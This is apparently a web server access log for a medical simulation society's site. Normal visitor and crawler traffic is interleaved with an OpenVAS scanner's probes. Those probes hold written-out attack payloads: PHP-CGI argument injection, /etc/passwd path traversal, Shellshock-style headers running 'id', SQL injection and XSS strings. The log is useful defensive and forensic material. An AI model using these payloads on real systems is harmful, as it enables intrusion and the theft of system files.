217.64.42.218 - - [08/Nov/2017:04:41:01 +0000] "POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 500 6349 "-" "-"
95.170.156.105 - - [08/Nov/2017:04:43:49 +0000] "GET /centres/centre.json?slug=centre-de-simulation-presage HTTP/1.1" 200 1598 "https://www.sesam-web.org/centres/map/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
207.46.13.66 - - [05/Nov/2017:13:47:32 +0000] "GET /centres/centre/swiss-centre-for-medical-simulation/ HTTP/1.1" 200 15203 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
217.64.42.218 - - [08/Nov/2017:04:39:05 +0000] "GET /spywall/login.php HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:34:02 +0000] "GET /News/ HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:39:52 +0000] "GET /index.cgi HTTP/1.1" 403 5807 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
40.77.167.68 - - [07/Nov/2017:22:26:37 +0000] "GET / HTTP/1.1" 403 6313 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.110 - - [08/Nov/2017:02:38:59 +0000] "GET /news/ssh-news-november-2014/ HTTP/1.1" 200 22073 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
217.64.42.218 - - [08/Nov/2017:04:45:53 +0000] "POST /cgi-bin/test HTTP/1.1" 404 6020 "-" "-"
157.55.39.110 - - [05/Nov/2017:13:48:22 +0000] "GET /centres/centre/biomedical-simulation-center-faculty-of-medicine-of-university-of-porto-csb/ HTTP/1.1" 200 15500 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
217.64.42.218 - - [08/Nov/2017:04:36:28 +0000] "GET /chgpwd.php HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:36:01 +0000] "GET /andromeda/andromeda.php HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:41:32 +0000] "GET /cgi-bin/includes/include.php?cct_base=../../../../../../../../../etc/passwd%00 HTTP/1.1" 404 584 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
157.55.39.58 - - [07/Nov/2017:11:03:28 +0000] "GET /events/pages/sesam-paris-2017/sesam-paris-2017/ HTTP/1.1" 200 22654 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
217.64.42.218 - - [08/Nov/2017:04:40:26 +0000] "GET /cgi-bin/plugin/themes/default/page_forgot.php?apps_path[themes]=/etc/passwd%00 HTTP/1.1" 404 601 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
212.133.241.172 - - [07/Nov/2017:08:39:08 +0000] "GET /abstracts/submitabstract/sesam-barcelona-2018/ HTTP/1.1" 302 5974 "https://www.sesam-web.org/events/event/sesam-barcelona-2018/" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
217.64.42.218 - - [08/Nov/2017:04:34:06 +0000] "GET /WideImage-master/composer.json HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:41:27 +0000] "GET /cms/module/forum/main.php?website=../../../../../../../../../etc/passwd%00 HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:47:15 +0000] "POST /cgi-bin/test-cgi.pl HTTP/1.1" 404 6027 "-" "-"
217.64.42.218 - - [08/Nov/2017:04:41:17 +0000] "GET /openstock/scr/soustab.php?dsn[phptype]=../../../../../../../../../../../etc/passwd%00 HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
157.55.39.58 - - [05/Nov/2017:13:48:49 +0000] "GET /meetings/regionalmeetings/ HTTP/1.1" 200 17448 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
217.64.42.218 - - [08/Nov/2017:04:38:59 +0000] "GET /clips/admin_area/login.php HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:41:22 +0000] "GET /cms/tiny_mce/plugins/ibrowser/ibrowser.php?lang=../../../../../../../../../../../../../etc/passwd%00 HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
158.85.81.118 - - [05/Nov/2017:23:24:40 +0000] "GET / HTTP/1.1" 403 5632 "-" "-"
217.64.42.218 - - [08/Nov/2017:04:35:24 +0000] "GET /about-show.do HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
207.46.13.144 - - [06/Nov/2017:17:41:21 +0000] "GET / HTTP/1.1" 403 6313 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.110 - - [06/Nov/2017:19:33:57 +0000] "GET /centres/?page=14 HTTP/1.1" 200 18122 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
70.35.220.98 - - [07/Nov/2017:16:08:27 +0000] "GET /abstracts/submitabstract/sesam-barcelona-2018/ HTTP/1.1" 302 491 "https://www.sesam-web.org/events/pages/sesam-barcelona-2018/sponsorship-and-exhibition2018/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
157.55.39.110 - - [05/Nov/2017:13:47:30 +0000] "GET /news/april-2015-message-president/ HTTP/1.1" 200 21686 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
217.64.42.218 - - [08/Nov/2017:04:35:02 +0000] "GET /login HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:49:21 +0000] "POST /cgi-bin/ezmlm-browse HTTP/1.1" 404 6028 "() { _; OpenVAS; } >_[$($())] {  echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id; }" "-"
217.64.42.218 - - [08/Nov/2017:04:47:46 +0000] "POST /cgi-sys/entropysearch.cgi HTTP/1.1" 403 5814 "() { OpenVAS:; }; echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id;" "-"
157.55.39.209 - - [09/Nov/2017:10:55:16 +0000] "GET /centres/centre/medical-education-simulation-hub-mesh-the-mid-yorkshire-nhs-trust/ HTTP/1.1" 200 15620 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
95.170.156.105 - - [08/Nov/2017:04:44:04 +0000] "GET /centres/centre.json?slug=simulation-centre-of-community-health-centre-ljubljana HTTP/1.1" 200 1861 "https://www.sesam-web.org/centres/map/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
217.64.42.218 - - [08/Nov/2017:04:33:57 +0000] "GET /scripts/vGQEdcpMXwKR.php4 HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
70.35.220.98 - - [07/Nov/2017:16:04:15 +0000] "GET /events/event/sesam-barcelona-2018/ HTTP/1.1" 200 22460 "https://www.sesam-web.org/events/pages/sesam-barcelona-2018/sponsorship-and-exhibition2018/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
217.64.42.218 - - [08/Nov/2017:04:40:58 +0000] "GET /shop/libs/smarty_ajax/index.php?_=&f=update_intro&page=../../../../../../../../../../../../../../../../../../etc/passwd%00 HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:38:29 +0000] "OPTIONS /cgi-bin/ HTTP/1.1" 403 568 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
187.32.203.60 - - [07/Nov/2017:18:51:23 +0000] "GET / HTTP/1.1" 200 25496 "https://www.google.com.br/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
217.64.42.218 - - [08/Nov/2017:04:41:55 +0000] "GET /scripts/script/cat_for_gen.php?ad=1&ad_direct=../&m_for_racine=%3C/option%3E%3C/SELECT%3E%3C?phpinfo();?%3E HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.9.204.106 - - [08/Nov/2017:10:22:58 +0000] "GET /subscrptions/ HTTP/1.1" 302 473 "https://www.sesam-web.org/membership/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36"
217.64.42.218 - - [08/Nov/2017:04:36:57 +0000] "GET /cgi-bin/help.html HTTP/1.1" 404 573 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:41:06 +0000] "GET /config/global.conf HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:33:59 +0000] "GET //UI/Login.jsp HTTP/1.1" 403 5834 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:40:50 +0000] "GET /brewthology/beerxml.php?r=null%20union%20select%201,2,3,4,5,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,7,8,9,10,11 HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
157.55.39.110 - - [05/Nov/2017:13:48:20 +0000] "GET /centres/?page=14 HTTP/1.1" 200 18473 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
217.64.42.218 - - [08/Nov/2017:04:38:28 +0000] "GET /phplite/ HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:34:38 +0000] "GET /tutos/ChangeLog HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
221.132.113.69 - - [07/Nov/2017:12:20:44 +0000] "GET /abstracts/851/responses/ HTTP/1.1" 200 14085 "https://www.sesam-web.org/abstracts/submitabstract/sesam-barcelona-2018/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
217.64.42.218 - - [08/Nov/2017:04:40:07 +0000] "GET /scripts/index.php?system=../../../../../../../../../etc/passwd%00 HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:42:17 +0000] "GET /scripts/admin/admin.php HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
157.55.39.87 - - [09/Nov/2017:08:02:40 +0000] "GET / HTTP/1.1" 403 6313 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
172.245.16.42 - - [06/Nov/2017:17:36:08 +0000] "GET / HTTP/1.1" 403 5833 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
217.64.42.218 - - [08/Nov/2017:04:35:21 +0000] "GET /cgi-bin/vpasswd.cgi_807918685 HTTP/1.1" 404 585 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:38:30 +0000] "OPTIONS /cgi-bin/ HTTP/1.1" 403 568 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.61.14.184 - - [08/Nov/2017:14:08:46 +0000] "GET /event/sesam-lisbon/register/ HTTP/1.0" 404 17690 "https://www.sesam-web.org/event/sesam-lisbon/register/" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"
217.64.42.218 - - [08/Nov/2017:04:38:52 +0000] "GET /apc/apcinfo.php HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
104.245.36.205 - - [06/Nov/2017:11:49:18 +0000] "GET / HTTP/1.1" 403 5833 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/36.0"
217.64.42.218 - - [08/Nov/2017:04:38:48 +0000] "GET / " 403 5535 "-" "-"
217.64.42.218 - - [08/Nov/2017:04:40:12 +0000] "GET /scripts/index.php?id=-1'%20UNION%20SELECT%201,2,3,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,5,6,7,8,9,10,11,12,13--+ HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:35:54 +0000] "GET /wonderdesk/wonderdesk.cgi HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
157.55.39.8 - - [07/Nov/2017:22:26:01 +0000] "GET /robots.txt HTTP/1.1" 200 24887 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
217.64.42.218 - - [08/Nov/2017:04:38:09 +0000] "OPTIONS / HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:38:53 +0000] "GET /open.php HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:41:32 +0000] "GET /cgi-bin/index.php/Special/Main/Templates?cmd=copy&which=%3Cscript%3Ealert(%27openvas-xss-test%27)%3C/script%3E HTTP/1.1" 404 596 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:38:19 +0000] "OPTIONS /scripts/ HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:33:55 +0000] "GET /cgi-bin/vGQEdcpMXwKR.shtml HTTP/1.1" 404 582 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:49:23 +0000] "GET /cgi-bin-sdb/printenv HTTP/1.1" 403 5814 "-" "-"
157.55.39.83 - - [05/Nov/2017:13:48:01 +0000] "GET /news/march-2015-message-president/ HTTP/1.1" 200 24329 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
217.64.42.218 - - [08/Nov/2017:04:34:42 +0000] "GET /cgi-bin/ChangeLog HTTP/1.1" 404 6062 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
54.236.9.39 - - [06/Nov/2017:20:10:40 +0000] "GET /events/pages/sesam-paris-2017/programme HTTP/1.1" 301 5586 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:42.0) Gecko/20100101 Firefox/42.0"
49.207.185.128 - - [09/Nov/2017:09:58:56 +0000] "POST / HTTP/1.1" 403 5295 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; GTB7.5; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET4.0C; .NET4.0E)"
217.64.42.218 - - [08/Nov/2017:04:39:53 +0000] "GET /cgi-bin/upload/account-login.php HTTP/1.1" 404 588 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
5.149.20.223 - - [05/Nov/2017:11:38:27 +0000] "GET /centres/ HTTP/1.1" 200 25012 "https://www.sesam-web.org/initiatives/literaryhighlights/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
217.64.42.218 - - [08/Nov/2017:04:37:51 +0000] "GET /cgi-bin/cbmw/mw.exe HTTP/1.1" 404 575 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:41:04 +0000] "GET /booking_calendar//details_view.php?event_id=1&date=2000-12-01&view=month&loc=loc1&page_info_message=<script>alert(/openvas-xss-test/)</script> HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
109.25.142.57 - - [07/Nov/2017:21:48:34 +0000] "GET /centres/centre.json?slug=antalya-health-directorate-region-training-research-and-simulation-centre HTTP/1.1" 200 2138 "https://www.sesam-web.org/centres/map/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
217.64.42.218 - - [08/Nov/2017:04:34:24 +0000] "GET /phpmailer/composer.json HTTP/1.1" 403 5807 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:34:04 +0000] "GET /scripts/docs/distribution/tour_page1.htm HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:35:15 +0000] "GET /scripts/GWWEB.EXE?HELP=bad-request HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
157.55.39.110 - - [05/Nov/2017:13:47:29 +0000] "GET /news/2015/11/ HTTP/1.1" 200 20429 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
217.64.42.218 - - [08/Nov/2017:04:35:00 +0000] "GET /ncadmin/ HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:33:57 +0000] "GET /5/ HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:40:26 +0000] "GET /labwiki/index.php?from=\";></><script>alert(/openvas-xss-test/)</script>&help=true&page=What_is_wiki HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:34:58 +0000] "GET /marketing/ HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:35:11 +0000] "GET /cgi-bin/CHANGES HTTP/1.1" 404 6023 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:34:12 +0000] "GET /xf/ HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
194.176.105.148 - - [08/Nov/2017:09:25:01 +0000] "POST /accounts/login/ HTTP/1.1" 200 14657 "https://www.sesam-web.org/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36"
217.64.42.218 - - [08/Nov/2017:04:38:44 +0000] "GET /ANT/Lisez%20moi.txt HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
157.55.39.58 - - [09/Nov/2017:10:55:01 +0000] "GET /centres/centre/institut-toulousain-de-simulation-en-sante/ HTTP/1.1" 200 15596 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
74.101.153.150 - - [07/Nov/2017:15:42:28 +0000] "GET /news/ HTTP/1.1" 200 31525 "https://www.sesam-web.org/SESAMAnnualMeetings/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
217.64.42.218 - - [08/Nov/2017:04:50:36 +0000] "POST /tmUnblock.cgi HTTP/1.1" 403 5814 "-" "-"
217.64.42.218 - - [08/Nov/2017:04:50:43 +0000] "GET /phppath/php HTTP/1.1" 403 5814 "-" "-"
217.64.42.218 - - [08/Nov/2017:04:37:02 +0000] "GET /htdocs/index.php HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:38:22 +0000] "OPTIONS /scripts/ HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
207.46.13.66 - - [05/Nov/2017:08:50:05 +0000] "GET /members/register/?next=/registrations/downloadeventinvoice/956/ HTTP/1.1" 200 33199 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
217.64.42.218 - - [08/Nov/2017:04:41:05 +0000] "GET /scripts/details_view.php?event_id=1&date=2000-12-01&view=month&loc=loc1&page_info_message=<script>alert(/openvas-xss-test/)</script> HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
157.55.39.83 - - [06/Nov/2017:19:33:25 +0000] "GET /centres/centre/simulation-centre-of-asl-naples-2-north/ HTTP/1.1" 200 21195 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.69.226 - - [08/Nov/2017:01:26:51 +0000] "GET /robots.txt HTTP/1.1" 200 24698 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
217.64.42.218 - - [08/Nov/2017:04:42:14 +0000] "GET /scripts/?page=shop/cart&func=cartAdd&product_id=' HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
193.137.66.254 - - [07/Nov/2017:09:58:25 +0000] "GET /favicon.ico HTTP/1.1" 200 7016 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
217.64.42.218 - - [08/Nov/2017:04:34:48 +0000] "GET /ibank/ HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:47:22 +0000] "GET /cgi-bin/cgiinfo.cgi HTTP/1.1" 404 6027 "-" "() { _; OpenVAS; } >_[$($())] {  echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id; }"
35.188.119.38 - - [06/Nov/2017:18:30:59 +0000] "GET /robots.txt HTTP/1.1" 200 24639 "-" "ltx71 - (http://ltx71.com/)"
217.64.42.218 - - [08/Nov/2017:04:37:49 +0000] "GET /cgi-bin/login_page.php HTTP/1.1" 404 578 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.9.204.106 - - [08/Nov/2017:14:20:59 +0000] "POST /autodiscover/autodiscover.xml HTTP/1.1" 403 5676 "-" "MacOutlook/15.25.0.160817 (Intelx64 Mac OS X Version 10.12.3 (Build 16D32))"
217.64.42.218 - - [08/Nov/2017:04:35:07 +0000] "GET /personal/ HTTP/1.1" 403 354 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:34:04 +0000] "GET /xampp/start.php HTTP/1.1" 403 5871 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:41:30 +0000] "GET /cgi-bin/index.php?typefilter=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd%00 HTTP/1.1" 404 573 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
68.180.229.225 - - [06/Nov/2017:14:12:51 +0000] "GET /network/sigs/ HTTP/1.1" 200 20306 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
217.64.42.218 - - [08/Nov/2017:04:39:09 +0000] "GET /doc/ HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:34:32 +0000] "GET /ddreport/ HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:34:18 +0000] "GET /cards/ HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
157.55.39.83 - - [07/Nov/2017:22:59:36 +0000] "GET /network/affiliations/ HTTP/1.1" 200 21361 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
217.64.42.218 - - [08/Nov/2017:04:35:57 +0000] "GET /ftp/flsummary.pl HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:38:53 +0000] "GET /osTicket/open.php HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:38:32 +0000] "OPTIONS /cgi-bin/ HTTP/1.1" 403 568 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
185.94.60.201 - - [07/Nov/2017:12:14:57 +0000] "GET /centres/centre.json?slug=centro-tecnologico-de-formacion-ctf-xxiac HTTP/1.1" 200 1761 "https://www.sesam-web.org/centres/map/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
157.55.39.110 - - [09/Nov/2017:10:54:35 +0000] "GET /centres/?page=2 HTTP/1.1" 200 19058 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
217.64.42.218 - - [08/Nov/2017:04:35:14 +0000] "GET /rtm.log HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:34:08 +0000] "GET /accounting/ HTTP/1.1" 403 354 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
157.55.39.83 - - [05/Nov/2017:13:48:34 +0000] "GET /members/register/?next=/events/event/sesam-lisbon/ HTTP/1.1" 200 27236 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.66 - - [09/Nov/2017:10:54:07 +0000] "GET /centres/centre/swiss-centre-for-medical-simulation/ HTTP/1.1" 200 15203 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
217.64.42.218 - - [08/Nov/2017:04:35:56 +0000] "GET /NamekoWebmail/nameko.php HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
105.225.74.240 - - [07/Nov/2017:15:19:23 +0000] "GET /members/receipt/ HTTP/1.1" 200 2184 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
217.64.42.218 - - [08/Nov/2017:04:34:21 +0000] "GET /cgi-auth/ HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
176.31.64.186 - - [08/Nov/2017:11:42:20 +0000] "GET /contact/ HTTP/1.1" 200 19032 "-" "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko"
217.64.42.218 - - [08/Nov/2017:04:40:09 +0000] "GET /scripts/admin/index.php?page=unexisting../../../../../../../../../../../../../../../../../../etc/passwd%00 HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
